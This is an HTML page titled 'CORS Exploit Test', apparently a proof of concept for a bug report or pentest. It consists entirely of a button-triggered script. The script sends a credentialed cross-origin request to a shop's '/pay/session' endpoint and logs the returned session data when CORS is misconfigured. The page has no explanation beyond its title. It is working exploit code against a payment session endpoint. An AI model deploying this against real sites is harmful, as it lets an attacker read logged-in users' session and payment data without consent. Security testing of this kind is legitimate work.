<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit Test</title>
</head>
<body>
  <h2>CORS Exploit Test</h2>
  <button onclick="exploit()">Exploit</button>
  <script>
    function exploit() {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://shop.app/pay/session', true);
      xhr.withCredentials = true;
      xhr.onreadystatechange = function() {
        console.log('ReadyState:', xhr.readyState, 'Status:', xhr.status);
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            console.log('Response:', xhr.responseText);
          } else {
            console.error('Error:', xhr.status);
          }
        }
      };
      xhr.onerror = function() {
        console.error('Request failed');
      };
      xhr.send();
    }
  </script>
</body>
</html>
